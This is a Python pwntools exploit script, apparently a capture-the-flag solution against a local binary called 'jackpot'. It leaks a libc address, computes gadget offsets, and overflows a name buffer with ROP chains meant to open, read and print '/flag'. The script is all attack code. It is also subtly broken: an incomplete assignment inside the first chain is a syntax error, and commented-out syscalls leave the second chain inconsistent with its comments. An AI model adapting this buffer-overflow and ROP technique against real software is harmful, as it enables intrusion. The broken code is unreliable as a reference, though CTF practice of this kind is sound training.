from pwn import *

r = process('./jackpot')

context.arch = 'amd64'

r.recvuntil(b'Give me your number: ')
r.sendline(b'31')
r.recvuntil(b'Here is your ticket 0x')
leak_libc = int(r.recvline()[:-1], 16)
log.info(f'{hex(leak_libc)=}')

libc_base = leak_libc - 0x1d90 - 0x28000
open_addr = libc_base + 0xec2f0 + 0x28000
read_addr = libc_base + 0xec5e0 + 0x28000
write_addr = libc_base + 0xec680 + 0x28000
log.info(f'{hex(libc_base)=}')
log.info(f'{hex(open_addr)=}')
log.info(f'{hex(read_addr)=}')
log.info(f'{hex(write_addr)=}')

jackpot_addr = 0x40129e

r.recvuntil(b'Sign your name: ')
pop_rax_ret = libc_base + 0x0000000000045eb0
pop_rdi_ret = libc_base + 0x000000000002a3e5
pop_rsi_ret = libc_base + 0x000000000002be51
pop_rdx_ret = libc_base + 0x00000000000796a2
syscall_ret = libc_base + 0x0000000000091316
bss_addr = 0x0000000000404400
main_fn = 0x4012cc#0x4013d4

rop_read_str = flat(
    # read(0, buf, 0x8)
    pop_rax_ret, 0,
    pop_rdi_ret, 0,
    pop_rsi_ret, bss_addr,
    pop_rdx_ret, 0x8,
    syscall_ret,

    pop_rsi_ret = 
    main_fn
)

rop_read_flag = flat(
    # Open filename
    # fd = open("/flag", 0);
    # pop_rax_ret, 2,
    pop_rdi_ret, bss_addr,
    pop_rsi_ret, 0,
    # syscall_ret,

    # Read the file
    # read(fd, buf, 0x30);
    # pop_rax_ret, 0,
    pop_rdi_ret, 3,    # we can oversee the fd is 3 because 0,1,2 are preserved by default
    pop_rsi_ret, bss_addr,
    pop_rdx_ret, 0x30,
    # syscall_ret,

    # Write the file
    # write(1, buf, 0x30); // 1 --> stdout
    # the 2nd and 3rd argument are the same to read
    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    syscall_ret
)
raw_input()
r.send(b'a'*15*8 + rop_read_str)
raw_input()
r.send(b'/flag'.ljust(0x10, b'\x00'))
raw_input()
r.send(b'a'*15*8 + rop_read_flag)


r.interactive()